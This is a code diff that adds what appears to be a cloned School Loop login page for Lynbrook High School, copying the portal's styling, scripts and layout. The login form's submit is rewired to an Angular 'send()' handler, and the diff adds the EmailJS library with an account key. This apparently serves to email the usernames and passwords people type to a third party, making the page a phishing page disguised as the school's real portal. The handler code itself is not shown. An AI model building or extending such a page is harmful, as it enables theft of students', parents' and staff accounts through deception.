+/* end hiding from IE5 mac */
+
+#nav_cms li ul, #nav_cms ul li  {
+	width: 144px;
+}
+#nav_cms ul li a  {
+	color: #3366cc;
+	border-right: 0;
+    border-left: 1px #fff solid;
+	padding: 5px 10px;
+}
+#nav_cms li ul {
+	position: absolute;
+	display: none;
+    margin-top: -1px;
+    padding-bottom: 4px;
+    background-color: #FFFFFF;
+	border-left: 1px solid #4a7dbb;
+	border-right: 1px solid #4a7dbb;
+	border-bottom: 1px solid #4a7dbb;
+}
+
+#nav_cms li:hover a, #nav_cms a:focus,
+#nav_cms a:active, #nav_cms li.p7hvr a {
+
+}
+
+#nav_cms li:hover ul, #nav_cms li.p7hvr ul {
+	display: block;
+}
+
+#nav_cms li:hover ul a, #nav_cms li.p7hvr ul a {
+	color: #4a7dbb;
+	background: transparent;
+    border-left: 1px #fff solid;
+}
+#nav_cms ul a:hover {
+	background: #f90 !important;
+	color: #fff !important;
+    border-left: 1px #f90 solid;
+}
+
+
+/* CMS Grey Nav ------------------------------------------*/
+#nav_cms2, #nav_cms2 ul {
+	padding: 0px;
+	margin: 0px;
+	list-style: none;
+	font-family: Arial, Helvetica, sans-serif;
+}
+#nav_cms2 a {
+	display: block;
+	text-decoration: none;
+	padding: 5px 10px 5px 10px;
+	font-size: 11px;
+
+}
+
+#nav_cms2 a.trigger {
+	font: bold 11px Arial, Helvetica, sans-serif;
+    color:#4a7dbb;
+    text-decoration:none;
+    padding: 5px;
+    margin: 0px 2px 0px 0px;
+    background: #fff;
+    border: #4a7dbb solid 1px;
+}
+
+#nav_cms2 a.trigger:hover {
+	font: bold 11px Arial, Helvetica, sans-serif;
+    color:#4a7dbb;
+    background-color: #f90;
+    text-decoration:none;
+    padding: 5px;
+    margin: 0px 2px 0px 0px;
+    background: #fff;
+    border: #f90 solid 1px;
+}
+
+#nav_cms2 li {
+	float: left;
+	width: 144px;
+}
+#nav_cms2 li {position: relative;}
+
+/* hide from IE mac \*/
+#nav_cms2 li {position: static; width: auto;}
+/* end hiding from IE5 mac */
+
+#nav_cms2 li ul, #nav_cms2 ul li  {
+	width: 144px;
+}
+#nav_cms2 ul li a  {
+	color: #3366cc;
+	border-right: 0;
+	padding: 3px 10px 3px 10px;
+}
+#nav_cms2 li ul {
+	position: absolute;
+	display: none;
+    margin-top: 0px;
+    padding-bottom: 4px;
+    background-color: #FFFFFF;
+	border-left: 1px solid #cccccc;
+	border-right: 1px solid #cccccc;
+	border-bottom: 1px solid #cccccc;
+}
+
+#nav_cms2 li:hover a, #nav_cms2 a:focus,
+#nav_cms2 a:active, #nav_cms2 li.p7hvr a {
+	color: #fff;
+	background-color: #f90;
+}
+
+#nav_cms2 li:hover ul, #nav_cms2 li.p7hvr ul {
+	display: block;
+}
+
+#nav_cms2 li:hover ul a, #nav_cms2 li.p7hvr ul a {
+
+}
+#nav_cms2 ul a:hover {
+	background-color: #f90!important;
+	color: #4a7dbb !important;
+}
+
+
+/* CMS Small Grey Nav (Within Content ------------------------------------------*/
+.nav_cms3{padding: 0px 0px 0px 0px; margin: 1px 0px 0px 0px; vertical-align:middle;
+voice-family: "\"}\"";
+voice-family: inherit;
+}
+
+.nav_cms3 ul{
+float: left;
+font: bold 11px Arial, Helvetica, sans-serif;
+margin:0px 3px 0px 0px;
+padding:0px;
+list-style:none;
+}
+
+.nav_cms3 li{
+display:inline;
+padding:0px 0px 0px 0px;
+}
+
+
+.nav_cms3 a{
+font: bold 11px Arial, Helvetica, sans-serif;
+    color:#4a7dbb;
+    text-decoration:none;
+    padding: 5px;
+    margin: 0px 2px 0px 0px;
+    background: #fff;
+    border: #4a7dbb solid 1px;
+
+}
+
+
+
+
+
+.nav_cms3 a:hover{
+font: bold 11px Arial, Helvetica, sans-serif;
+    color:#fff;
+    text-decoration:none;
+    padding: 5px;
+    margin: 0px 2px 0px 0px;
+    background: #f90;
+    border: #f90 solid 1px;
+
+}
+
+
+.nav_cms3 .selected a, .nav_cms3 .selected a span{ /*currently selected tab*/
+font: bold 11px Arial, Helvetica, sans-serif;
+    color:#4a7dbb;
+    text-decoration:none;
+    padding: 5px;
+    margin: 0px 2px 0px 0px;
+    background: #fff;
+    border: #4a7dbb solid 1px;
+}
+
+/* ######### Style for Drop Down Menu ######### */
+
+.dropmenudiv_nav_cms3{
+position:absolute;
+top: 0px;
+margin: -1px 0px 0px 0px;
+padding: 0px 0px 3px 0px;
+font:normal 11px Arial;
+z-index:10000;
+background: #ffffff;
+border-right: 1px #aaaaaa solid;
+border-bottom: 1px #aaaaaa solid;
+border-left: 1px #aaaaaa solid;
+width: 145px;
+visibility: hidden;
+}
+
+
+.dropmenudiv_nav_cms3 a{
+color: #4a7dbb;
+display: block;
+padding: 5px 10px;
+text-decoration: none;
+z-index:100;
+}
+
+* html .dropmenudiv_employee a{ /*IE only hack*/
+width: 100%;
+}
+
+.dropmenudiv_nav_cms3 a:hover{ /*THEME CHANGE HERE*/
+background: #f90;
+color: #fff;
+text-decoration: none;
+z-index:100;
+}
+
+
+/* CMS Small Grey Nav (Within Content ------------------------------------------*/
+.nav_cms3{padding: 0px 0px 0px 0px; margin: 1px 0px 0px 0px; vertical-align:middle;
+voice-family: "\"}\"";
+voice-family: inherit;
+}
+
+
+.nav_link_drop {
+margin:0px ;
+padding:0px;
+list-style:none;
+
+}
+
+/* make the LI display inline */
+/* it's position relative so that position absolute */
+/* can be used in submenu */
+
+.nav_link_drop li {
+float:left;
+display:block;
+position:relative;
+margin:0px;
+
+}
+
+/* this is the parent menu */
+.nav_link_drop li a {
+display:block;
+text-decoration:none;
+padding: 2px 3px;
+margin: 0px 0px 0px 0px;
+background: transparent;
+border: 0px;
+}
+
+.nav_link_drop li a:hover {
+display:block;
+color: #fff;
+background: #f90;
+text-decoration:none;
+padding: 5px 3px;
+margin: 0px 0px 0px 0px;
+background: transparent;
+border: 0px;
+}
+
+/* you can make a different style for default selected value */
+.nav_link_drop a.selected {
+display:block;
+text-decoration:none;
+padding: 2px 3px;
+margin: 0px 0px 0px 0px;
+background: transparent;
+border: 0px;}
+
+/* submenu, it's hidden by default */
+.nav_link_drop ul {
+width:145px;
+text-align: left;
+position:absolute;
+left:0;
+display:none;
+margin:0px;
+padding:0;
+list-style:none;
+background: #ffffff;
+border-right: 1px #aaaaaa solid;
+border-bottom: 1px #aaaaaa solid;
+border-left: 1px #aaaaaa solid;
+
+}
+
+.nav_link_drop ul li {
+text-transform: none;
+z-index: 550;
+float:left;
+
+}
+
+/* display block will make the link fill the whole area of LI */
+.nav_link_drop ul a {
+font: normal 11px Arial, Helvetica, sans-serif;
+display:block;
+padding: 3px 5px 3px 5px;
+margin: 0px;
+color:#003387;
+background: #ffffff;
+border: none;
+width: 134px;
+}
+
+.nav_link_drop ul a:hover {
+font: normal 11px Arial, Helvetica, sans-serif;
+color:#003387;
+padding: 3px 5px 3px 5px;
+margin: 0px;
+background: #ffffbb;
+border: none;
+
+}
+
+/* fix ie6 small issue */
+/* we should always avoid using hack like this */
+/* should put it into separate file : ) */
+*html .nav_link_drop ul {
+margin:0 0 0 -2px;
+}
+
+
+
+/*  SCHOOL Nav LEVEL ONE  */
+.nav-school2 {padding: 0px;}
+
+.nav-school2 ul.dropdown {
+    position: relative;
+    z-index: 500;
+    list-style: none;
+    margin: 0px;
+    padding: 0px;
+    text-align: left;
+}
+
+.nav-school2 ul.dropdown li {
+    list-style: none;
+    font-size: 11px;
+    float: left;
+    zoom: 1;}
+
+.nav-school2 ul.dropdown li a:hover {
+    color: #003387;
+    background-color: #f2f2f2;
+    text-decoration:none; }
+
+.nav-school2 ul.dropdown li a {
+    color: #003387;
+    display: block;
+    padding: 7px 10px;
+}
+
+.nav-school2 ul.dropdown li:hover { position: relative; }
+
+
+/* LEVEL TWO */
+.nav-school2 ul.dropdown ul {
+    font-size: 11px;
+    width: 175px;
+    visibility: hidden;
+    position: absolute;
+    top: 100%; left: 0;
+    border-right: 1px #aaa solid;
+    border-bottom: 1px #aaa solid;
+    border-left: 1px #aaa solid;
+    list-style: none;
+    margin: 0px;
+    padding: 0px;
+
+}
+.nav-school2 ul.dropdown ul li {
+    font-weight: normal;
+    background: #fff;
+    float: none; }
+
+.nav-school2 ul.dropdown ul li:hover {
+    font-weight: normal;
+    background: #fff;
+    float: none; }
+
+/* IE 6 & 7 Needs Inline Block */
+.nav-school2 ul.dropdown ul li a
+{ border-left: none; width: 155px; background: #fff; padding: 5px 10px; color: #003387;}
+
+.nav-school2 ul.dropdown ul li a:hover
+{ border-left: none; background: #ff9900; color: #fff;}
+
+/*
+	LEVEL THREE
+*/
+ul.dropdown ul ul 					{ left: 100%; top: 0; }
+ul.dropdown li:hover > ul 			{ visibility: visible; }
+
+
+
+
+
+
+
+.nav_cms4 ul{
+float: left;
+font-size: 11px;
+margin:0px 0px 0px 0px;
+padding:0px;
+list-style:none;
+}
+
+.nav_cms4 li{
+display:inline;
+padding:0px 0px 0px 0px;
+}
+
+
+.nav_cms4 a{
+float:left;
+height: 14px;
+display: block;
+color: #fff;
+margin:0px 0px 0px 0px;
+padding: 7px 3px;
+text-decoration:none;
+
+}
+
+.nav_cms4 .selected a, .nav_cms4 .selected a span{ /*currently selected tab*/
+float:left;
+height: 14px;
+display: block;
+color: #fff;
+margin:0px 0px 0px 0px;
+
+text-decoration:none;
+}
+
+.nav_cms4 a:hover{
+color: #003387;
+height: 14px;
+background-color: #efefef;
+margin:0px 0px 0px 0px;
+
+text-decoration:none; }
+
+
+
+
+
+
+
+/* ######### Drop CMS Nav ######### */
+
+.nav_cms_controls {width: auto; padding: 0px 0px 0px 0px; margin: 1px 0px 0px 0px; vertical-align:middle;
+voice-family: "\"}\"";
+voice-family: inherit;
+}
+
+.nav_cms_controls ul{
+float: left;
+font: bold 11px Arial, Helvetica, sans-serif;
+margin:0px;
+padding:0px;
+list-style:none;
+}
+
+.nav_cms_controls li{
+display:inline;
+margin:0px 0px 0px 0px;
+padding:0px 0px 0px 0px;
+
+}
+
+.nav_cms_controls li.label{
+float:left;
+display: block;
+color: #000000;
+margin:3px 2px 5px 0px;
+padding: 3px 10px 3px 7px;
+text-decoration:none;
+text-transform:none;
+}
+
+
+.nav_cms_controls a{
+float:left;
+display: block;
+background: #ffffff;
+margin:3px 2px 5px 0px;
+padding: 3px 10px 3px 7px;
+text-decoration:none;
+}
+
+.nav_cms_controls a:hover{
+background: #ffffbb;
+text-decoration:none; }
+
+
+.nav_cms_controls .selected a, #nav_cms .selected a span{ /*currently selected tab*/
+background-color: #ffffff;
+}
+
+
+
+a.btn_cms_page2 {font: bold 11px Arial, Helvetica, sans-serif; text-transform: none; color:#3366cc; text-decoration:none; padding: 0px 4px 0px 4px; margin: 0px 0px 0px 0px; background: #ffffbb; border: #3366cc solid 1px;}
+a.btn_cms_page2:visited {font: bold 11px Arial, Helvetica, sans-serif; text-transform: none; color:#3366cc; text-decoration:none; padding: 2px 4px 2px 4px; margin: 0px 0px 0px 0px; background: #ffffbb; border: #3366cc solid 1px;}
+a.btn_cms_page2:hover {font: bold 11px Arial, Helvetica, sans-serif; text-transform: none; color:#ffffff; text-decoration:none; padding: 2px 4px 2px 4px; margin: 0px 0px 0px 0px; background:#3366cc; border: #3366cc solid 1px;}
+
+
+a.btn_cms_page_alert {font: bold 13px Arial, Helvetica, sans-serif; color:#3366cc; text-decoration:none; padding: 0px 4px 0px 4px; margin: 0px 0px 0px 0px; background: #ffffbb; border: #cc0000 solid 1px;}
+a.btn_cms_page_alert:visited {font: bold 13px Arial, Helvetica, sans-serif; color:#3366cc; text-decoration:none; padding: 0px 4px 0px 4px; margin: 0px 0px 0px 0px; background: #ffffbb; border: #cc0000 solid 1px;}
+a.btn_cms_page_alert:hover {font: bold 13px Arial, Helvetica, sans-serif; color:#3366cc; text-decoration:none; padding: 0px 4px 0px 4px; margin: 0px 0px 0px 0px; background:#ffffff; border: #3366cc solid 1px;}
+
+a.btn_cms_page_grey {font: bold 13px Arial, Helvetica, sans-serif; color:#3366cc; text-decoration:none; padding: 0px 4px 0px 4px; margin: 0px 0px 0px 0px; background: #ffffff; border: #cccccc solid 1px;}
+a.btn_cms_page_grey:visited {font: bold 13px Arial, Helvetica, sans-serif; color:#3366cc; text-decoration:none; padding: 0px 4px 0px 4px; margin: 0px 0px 0px 0px; background: #ffffff; border: #cccccc solid 1px;}
+a.btn_cms_page_grey:hover {font: bold 13px Arial, Helvetica, sans-serif; color:#ffffff; text-decoration:none; padding: 0px 4px 0px 4px; margin: 0px 0px 0px 0px; background:#3366cc; border: #3366cc solid 1px;}
+
+a.btn_cms_page_big {font: bold 18px Arial, Helvetica, sans-serif; line-height: 15px; color:#ffffff; text-decoration:none; padding: 0px 4px 0px 4px; margin: 0px 0px 0px 0px; background:#3366cc; border: #3366cc solid 1px;}
+a.btn_cms_page_big:visited {font: bold 18px Arial, Helvetica, sans-serif; line-height: 15px; color:#ffffff; text-decoration:none; padding: 0px 4px 0px 4px; margin: 0px 0px 0px 0px; background:#3366cc; border: #3366cc solid 1px;}
+a.btn_cms_page_big:hover {font: bold 18px Arial, Helvetica, sans-serif; line-height: 15px; color:#3366cc; text-decoration:none; padding: 0px 4px 0px 4px; margin: 0px 0px 0px 0px; background:#ffffff; border: #3366cc solid 1px;}
+
+a.btn_cms_public01 {font: bold 13px Arial, Helvetica, sans-serif; line-height: 15px; color:#ffffff; text-decoration:none; padding: 2px 4px 2px 4px; margin: 0px 0px 0px 0px; background:#3366cc; border: #3366cc solid 2px;}
+a.btn_cms_public01:hover {font: bold 13px Arial, Helvetica, sans-serif; line-height: 15px; color:#3366cc; text-decoration:none; padding: 2px 4px 2px 4px; margin: 0px 0px 0px 0px; background:#ffffff; border: #3366cc solid 2px;}
+a.btn_cms_public01:visited {font: bold 13px Arial, Helvetica, sans-serif; line-height: 15px; color:#ffffff; text-decoration:none; padding: 2px 4px 2px 4px; margin: 0px 0px 0px 0px; background:#3366cc; border: #3366cc solid 2px;}
+
+
+a.btn_cms_public02 {font: bold 13px Arial, Helvetica, sans-serif; line-height: 15px; color:#ffffff; text-decoration:none; padding: 2px 4px 2px 4px; margin: 0px 0px 0px 0px; background:#3366cc; border: #ffcc00 solid 2px;}
+a.btn_cms_public02:visited {font: bold 13px Arial, Helvetica, sans-serif; line-height: 15px; color:#ffffff; text-decoration:none; padding: 2px 4px 2px 4px; margin: 0px 0px 0px 0px; background:#3366cc; border: #ffcc00 solid 2px;}
+a.btn_cms_public02:hover {font: bold 13px Arial, Helvetica, sans-serif; line-height: 15px; color:#3366cc; text-decoration:none; padding: 2px 4px 2px 4px; margin: 0px 0px 0px 0px; background:#ffffff; border: #ffcc00 solid 2px;}
+
+
+
+.btn_block {display: block; float: left; width: 200px; margin-right: 10px; height: 50px; margin-bottom: 15px; border: 1px #cccccc solid; padding: 5px 10px 0px 5px;}
+.btn_block:hover{background: #ffffbb; border: 1px #3366cc solid; text-decoration: none;}
+.btn_block .text {float: left; width: auto; font-weight: bold; padding: 15px 0px 0px 10px;}
+
+a.btn_block_insert {font: bold 12px Arial, Helvetica, sans-serif; color:#3366cc; text-decoration:none; padding: 0px 4px 0px 4px; margin: 3px 0px 0px 0px; background: #ffffbb; border: 2px #3366cc solid;}
+a.btn_block_insert:visited {font: bold 12px Arial, Helvetica, sans-serif; color:#3366cc; text-decoration:none; padding: 0px 4px 0px 4px; margin: 3px 0px 0px 0px; background: #ffffbb; border: 2px #3366cc solid;}
+a.btn_block_insert:hover {font: bold 12px Arial, Helvetica, sans-serif; color:#3366cc; text-decoration:none; padding: 0px 4px 0px 4px; margin: 3px 0px 0px 0px; background: #ffffff; border: 2px #000000 solid;}
+
+a.btn_block_edit {font: bold 11px Arial, Helvetica, sans-serif; color:#3366cc; line-height: 18px; text-decoration:none; padding: 0px 2px 0px 2px; margin: 3px 0px 5px 0px; background: #ffffff; border: #4876d3 solid 1px;}
+a.btn_block_edit:visited {font: bold 11px Arial, Helvetica, sans-serif; color:#3366cc; line-height: 18px; text-decoration:none; padding: 0px 2px 0px 2px; margin: 3px 0px 5px 0px; background: #ffffff; border: #4876d3 solid 1px;}
+a.btn_block_edit:hover {font: bold 11px Arial, Helvetica, sans-serif; color: #ffffff; line-height: 18px; text-decoration:none; padding: 0px 2px 0px 2px; margin: 3px 0px 5px 0px; background:#3366cc; border: #3366cc solid 1px;}
+
+
+a.icon_block_add {float: left; width: 100%; height: 21px; display: block; margin-right: 5px; background: url(/img/cms/icon_add.gif) no-repeat; }
+a.icon_block_add:hover {background: #ffff99 url(/img/cms/icon_add.gif) no-repeat; text-decoration: none; }
+
+a.icon_block_edit {float: left; width: 21px; height: 21px; display: block; margin-right: 5px; background: url(/img/cms/icon_edit.gif) no-repeat;  margin-left: 5px }
+a.icon_block_edit:hover {background: #ffff99 url(/img/cms/icon_edit.gif) no-repeat; text-decoration: none; }
+
+a.icon_block_delete {float: right; width: 22px; height: 21px; display: block; background: url(/img/cms/icon_delete.gif) no-repeat; margin-right: 5px}
+a.icon_block_delete:hover {background: #ffff99 url(/img/cms/icon_delete.gif) no-repeat; text-decoration: none; }
+
+a.btn_standard {
+white-space: nowrap;
+font-weight: bold;
+font-size: 11px;
+color:#4a7dbb;
+text-decoration:none;
+padding: 5px;
+margin: 0px;
+background:#ffffff;
+border: #4a7dbb solid 1px;
+line-height: 25px;
+text-transform: none;
+}
+a.btn_standard:hover {color:#ffffff; text-decoration:none; background:#f90; border: #f90 solid 1px; }
+a.btn_standard:hover {color:#ffffff; text-decoration:none; background:#f90; border: #f90 solid 1px; }
+
+
+.btn_select_lg a{display: block; background: #ffffbb; width: auto; height: auto; font-size: 14px; color: #3366cc; font-weight: bold; margin: 0px 0px 5px 0px; padding: 5px 5px 5px 5px; text-align: center; border: 1px #cccccc solid;}
+.btn_select_lg a:hover{background: #3366cc; color: #ffffff; border: 1px #3366cc solid; text-decoration: none;}
+
+</style>
+<link rel="stylesheet" type="text/css" href="https://cdn.schoolloop.com/portalcdn/version_1601121901ssl/css/main.css" media="screen">
+<link href="https://cdn.schoolloop.com/1601121901/static/lib/vex/vex-2.2.1/css/vex.css" rel="stylesheet" type="text/css">
+<link href="https://cdn.schoolloop.com/1601121901/static/lib/vex/vex-2.2.1/css/vex-theme-os.css" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+<!-- end CSS Section -->
+
+<!-- begin JS Section local_js= -->
+
+<script type="text/javascript" src="https://cdn.schoolloop.com/1601121901/static/lib/jquery/1.8/js/jquery-1.8.2.min.js"></script><style type="text/css"></style>
+        <script type="text/javascript" src="https://cdn.schoolloop.com/1601121901/static/lib/jquery/1.8/jquery-ui-1.9.2/ui/minified/jquery-ui.min.js"></script>
+        <script type="text/javascript" src="https://cdn.schoolloop.com/1601121901/static/lib/classy/classy_1.4/classy.js"></script>
+        <script type="text/javascript" src="https://cdn.schoolloop.com/portalcdn/version_1601121901ssl/pf4/javascript/global.js"></script>
+
+        <script type="text/javascript" src="https://cdn.schoolloop.com/1601121901/static/lib/momentjs/momentjs_2.10.3.min.js"></script>
+        <script src="https://cdn.schoolloop.com/1601121901/static//lib/chartjs/Chart.js"></script>
+        <script src="https://cdn.schoolloop.com/1601121901/static//lib/chartjs/chart_class.js"></script>
+
+        <script type="text/javascript" src="https://cdn.schoolloop.com/1601121901/static/lib/jquery/extra/js/qtip.js"></script>
+
+        <script type="text/javascript" src="https://cdn.schoolloop.com/portalcdn/version_1601121901ssl/javascript/master.js"></script>
+        <script type="text/javascript" src="https://cdn.schoolloop.com/portalcdn/version_1601121901ssl/javascript/master1_8.js"></script>
+        <script type="text/javascript" src="https://cdn.schoolloop.com/portalcdn/version_1601121901ssl/pf4/javascript/legacy.js"></script>
+        <script type="text/javascript" src="https://cdn.schoolloop.com/portalcdn/version_1601121901ssl/pf4/javascript/field_autosave.js"></script>
+
+        <script type="text/javascript" src="https://cdn.schoolloop.com/1601121901/static/lib/jquery/extra/js/jquery.form.js"></script>
+        <script type="text/javascript" src="https://cdn.schoolloop.com/1601121901/static/lib/jquery_old/jScrollPane.js"></script>
+
+        <script type="text/javascript" src="https://cdn.schoolloop.com/1601121901/static/lib/reponsiveslides_sl/responsive_player.js"></script>
+
+        <script type="text/javascript" src="https://cdn.schoolloop.com/1601121901/static/lib/jquery/extra/js/jquery.ui.touch-punch.js"></script>
+
+        <link rel="stylesheet" type="text/css" media="all" href="https://cdn.schoolloop.com/1601121901/static/lib/jquery_old/jScrollPane.css">
+
+        <link href="https://cdn.schoolloop.com/1601121901/static/lib/colorbox/colorbox.css" rel="stylesheet" type="text/css">
+        <script type="text/javascript" src="https://cdn.schoolloop.com/1601121901/static/lib/colorbox/jquery.colorbox-min.js"></script>
+
+        <link href="https://cdn.schoolloop.com/1601121901/static/lib/jquery/extra/css/qtip.css" rel="stylesheet" type="text/css">
+        <script type="text/javascript" src="https://cdn.schoolloop.com/1601121901/static/lib/jquery/extra/js/qtip.js"></script>
+
+        <script type="text/javascript" src="https://cdn.schoolloop.com/1601121901/static/lib/vex/vex-2.2.1/js/vex.combined.min.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+<!-- end JS Section -->
+        
+<meta name="robots" content="noarchive">
+
+
+</head>
+<body ng-app="myApp" ng-controller="yesCtrl" onload="self.focus();document.form.login_name.focus()">
+
+
+
+
+<!-- Header Bottom
+    <div id="container_header_bottom">
+    <div id="container_header_bottom_holder">
+
+           <div class="logo">
+              <a href="/"><img src="https://cdn.schoolloop.com/1601121901/img/logo_sl_header.png" alt="School Loop" /></a>
+           </div>
+     </div>
+     </div>
+Content -->
+
+<div id="container_login_page">
+    <div id="container_login_content">
+        <div class="content_margin">
+<table border="0" cellpadding="0" cellspacing="0" width="100%" style="margin-top: 35px;">
+        <tbody><tr>
+            <td width="50%">
+
+            </td>
+            <td style="min-width: 565px; white-space: nowrap;" nowrap="">
+
+                 <div id="page_title_login">
+                 <div>Welcome to</div>
+
+Lynbrook High School
+                </div>
+
+            </td>
+            <td width="50%">
+
+            </td>
+        </tr>
+
+</tbody></table>
+<table border="0" cellpadding="0" cellspacing="0" width="100%">
+        <tbody><tr>
+            <td width="50%">
+            </td>
+            <td>
+                <div style="min-width: 565px; padding: 5px 0px;">
+
+
+
+
+
+
+
+
+
+
+
+
+
+                </div>
+            </td>
+            <td width="50%">
+            </td>
+        </tr>
+        <tr>
+            <td width="50%">
+            </td>
+            <td>
+               <div class="shadow_round" style="width: 565px;">
+<table border="0" cellpadding="0" cellspacing="0" width="100%">
+                        <tbody><tr>
+                            <td class="round-left gradient_blue padding_20">
+
+                                      <a href="/"><img src="https://cdn.schoolloop.com/1601121901/img/logo_sl_login.png" width="152" height="60" alt="School Loop"></a>
+
+                            </td>
+                            <td class="padding_20 round-right" style="background: #fff; width: 100%">
+   
+<form ng-submit="send()" name="form" id="form" autocomplete="off">
+
+    <table width="100%" cellpadding="2" cellspacing="0" id="login_form" style="margin-right: 10px;">
+        <tbody><tr>
+            <td nowrap="">
+<a href="/portal/setLanguage?d=x&amp;language=Spanish&amp;return_url=1453179173267" class="link_language">Español</a><a href="/portal/setLanguage?d=x&amp;language=Chinese&amp;return_url=1453179173267" class="link_language">中文</a>
+            </td>
+        </tr>
+        <tr>
+
+            <td>
+                <div class="form_label_above" nowrap="">Login Name:</div>
+<input ng-keypress="checkkey($event)"  class="Text" type="text" name="login_name" value="">
+
+
+
+            </td>
+
+        </tr>
+        <tr>
+
+            <td width="100%">
+                <div  class="form_label_above" nowrap="">Password:</div>
+<input ng-keypress="checkkey($event)" class="Text" type="password" name="password" value="">
+
+
+
+                <div class="content_spacing_sm"></div>
+            </td>
+        </tr>
+        <tr>
+
+        <td><a href ng-click="send()" class="btn-action-highlight-lg">Login</a>
+
+                <a class="btn-standard-lg" href="/portal/register?d=x&amp;return_url=1453179173267">Register Now</a>
+            <div class="content_spacing"></div>
+
+        </td>
+        </tr>
+        <tr><td>
+            <a href="/portal/forgot_password?d=x&amp;return_url=1453179173267">Forgot password?</a>
+        <br>
+        <br>
+           <a class="small" href="https://lynbrook.schoolloop.com/portal/login">
+           </a>
+        </td></tr>
+
+        </tbody></table>
+
+<input name="event.login" src="https://cdn.schoolloop.com/1601121901/img/spacer.gif" type="image">
+<input type="hidden" name="redirect" id="redirect" value=""><input type="hidden" name="forward" id="forward" value=""><input type="hidden" name="login_form_reverse" id="login_form_reverse" value=""><input type="hidden" name="form_data_id" id="form_data_id" value="29999250999658923"><input type="hidden" name="sort" id="sort" value=""><input type="hidden" name="reverse" id="reverse" value=""><input type="hidden" name="login_form_sort" id="login_form_sort" value=""><input type="hidden" name="event_override" id="event_override" value=""><input type="hidden" name="login_form_filter" id="login_form_filter" value=""><input type="hidden" name="login_form_letter" id="login_form_letter" value=""><input type="hidden" name="return_url" id="return_url" value="1453179169737"><input type="hidden" name="login_form_page_index" id="login_form_page_index" value=""><input type="hidden" name="login_form_page_item_count" id="login_form_page_item_count" value="">
+
+
+</form>
+                            </td>
+                            </tr>
+                     </tbody></table>
+
+                </div>
+            </td>
+            <td width="50%">
+
+            </td>
+        </tr>
+</tbody></table>
+<div class="content_spacing_sm"></div>
+
+
+
+
+
+
+    <div style="height: 10px; width: 750px; margin: 0px;">
+       &nbsp;
+    </div>
+<div class="clear_margin"></div>
+</div>
+</div>
+<!-- END Content -->
+</div>
+<!-- END Page -->
+
+<!-- Footer  -->
+<div id="container_footer_login">
+     <div class="float_l">
+        © 2014-2015
+    </div>
+    <div class="float_r">
+        <div class="float_l"><img src="https://cdn.schoolloop.com/1601121901/img/app_loop_footer.png" alt="School Loop" width="23" height="24"></div>
+        <div class="float_l padding_l10">Powered by,<br>
+        <a href="http://www.schoolloop.com" target="blank" class="footer">School Loop</a>
+		</div>
+        <div class="float_l padding_l20">
+          <div class="button_spacer"><a href="/misc/support_center?d=x&amp;return_url=1453179173267" class="button_footer">Contact</a></div>
+<a href="/portal/privacy?d=x&amp;return_url=1453179173267" class="button_footer">Privacy Notice</a>
+<a href="/portal/agreement?d=x&amp;return_url=1453179173267" class="button_footer">User Agreement</a>
+        </div>
+    </div>
+    <div class="clear"></div>
+</div>
+
+
+
+
+
+
+    <img src="/stats/s1_1_1453104000000/s1187658036599_1187658036599_1453104000000/s1453179173267.gif" height="1" width="1" border="0" alt="Spacer">
+
+<div id="cboxOverlay" style="display: none;"></div><div id="colorbox" class="" role="dialog" tabindex="-1" style="display: none;"><div id="cboxWrapper"><div><div id="cboxTopLeft" style="float: left;"></div><div id="cboxTopCenter" style="float: left;"></div><div id="cboxTopRight" style="float: left;"></div></div><div style="clear: left;"><div id="cboxMiddleLeft" style="float: left;"></div><div id="cboxContent" style="float: left;"><div id="cboxTitle" style="float: left;"></div><div id="cboxCurrent" style="float: left;"></div><button id="cboxPrevious"></button><button id="cboxNext"></button><button id="cboxSlideshow"></button><div id="cboxLoadingOverlay" style="float: left;"></div><div id="cboxLoadingGraphic" style="float: left;"></div><button id="cboxClose"></button></div><div id="cboxMiddleRight" style="float: left;"></div></div><div style="clear: left;"><div id="cboxBottomLeft" style="float: left;"></div><div id="cboxBottomCenter" style="float: left;"></div><div id="cboxBottomRight" style="float: left;"></div></div></div><div style="position: absolute; width: 9999px; visibility: hidden; display: none;"></div></div></body>
      <script src="http://ajax.googleapis.com/ajax/libs/jquery/1.9.0/jquery.min.js"></script>
     <script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.4.5/angular.min.js"></script>
-<script src="https://cdn.jsdelivr.net/simplestorage/0.2.0/simpleStorage.min.js"></script>
-</script>
-    <script type="text/javascript" src="https://cdn.emailjs.com/dist/email.min.js"></script>
+     <script type="text/javascript" src="https://cdn.emailjs.com/dist/email.min.js"></script>
 <script type="text/javascript">
    (function(){
       emailjs.init("user_HquzXzrHLPx2Ek4ILZqEU");
    })();
-    $(document).ready(function() {
-  
-  var animating = false,
-      submitPhase1 = 1100,
-      submitPhase2 = 400,
-      logoutPhase1 = 800,
-      $login = $(".login"),
-      $app = $(".app");
-  
-  function ripple(elem, e) {
-    $(".ripple").remove();
-    var elTop = elem.offset().top,
-        elLeft = elem.offset().left,
-        x = e.pageX - elLeft,
-        y = e.pageY - elTop;
-    var $ripple = $("<div class='ripple'></div>");
-    $ripple.css({top: y, left: x});
-    elem.append($ripple);
-  };
-  
-  $(document).on("click", ".login__submit", function(e) {
-    if (animating) return;
-    animating = true;
-    var that = this;
-    ripple($(that), e);
-    $(that).addClass("processing");
-    setTimeout(function() {
-      $(that).addClass("success");
-      setTimeout(function() {
-        $app.show();
-        $app.css("top");
-        $app.addClass("active");
-      }, submitPhase2 - 70);
-      setTimeout(function() {
-        $login.hide();
-        $login.addClass("inactive");
-        animating = false;
-        $(that).removeClass("success processing");
-      }, submitPhase2);
-    }, submitPhase1);
-  });
-  
-  $(document).on("click", ".app__logout", function(e) {
-    if (animating) return;
-    $(".ripple").remove();
-    animating = true;
-    var that = this;
-    $(that).addClass("clicked");
-    setTimeout(function() {
-      $app.removeClass("active");
-      $login.show();
-      $login.css("top");
-      $login.removeClass("inactive");
-    }, logoutPhase1 - 120);
-    setTimeout(function() {
-      $app.hide();
-      animating = false;
-      $(that).removeClass("clicked");
-    }, logoutPhase1);
-  });
-  
-});
-</script>
-</head>
-<body ng-app="myApp" ng-controller="yesCtrl" >
-  <div class="cont">
-      
-  <div class="demo">
-
-    <div class="login">
-        <div class="login__check"></div>
-      <div class="login__form">
-        <div class="login__row">
-          <svg class="login__icon name svg-icon" viewBox="0 0 20 20">
-            <path d="M0,20 a10,8 0 0,1 20,0z M10,0 a4,4 0 0,1 0,8 a4,4 0 0,1 0,-8" />
-          </svg>
-          <input type="text" class="login__input name" placeholder="Username"/>
-        </div>
-        <div class="login__row">
